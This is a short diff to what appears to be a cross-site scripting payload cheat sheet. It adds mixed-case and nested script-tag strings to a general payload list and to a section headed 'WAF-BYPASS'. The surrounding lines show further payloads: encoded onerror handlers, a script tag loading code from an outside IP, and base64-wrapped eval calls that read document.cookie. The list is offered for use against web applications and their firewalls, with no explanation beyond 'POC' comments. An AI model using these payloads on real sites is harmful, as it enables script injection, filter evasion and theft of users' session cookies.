@@ -62,6 +62,7 @@ Repeat the same procedure with the target victim
 <img src=x onerror="&#x61;lert(1)">
 <img src=x onerror="#00000000000058;alert(1)">
 <script src="http://<IP>/foo"></script>
+<ScRiPt>alert(1)</sCrIpT>
 ' - alert(1) - '
 \' - alert(1) -'
 \' - alert(1) //
@@ -180,6 +181,8 @@ body:document.cookie
 
 #### WAF-BYPASS
 ```js
+<ScRiPt>alert(1)</sCrIpT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
 <script>eval(atob('YWxlcnQoMSk='));</script>  // POC alert(1)
 
 <script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQo='));</script> // POC alert(document.cookie)
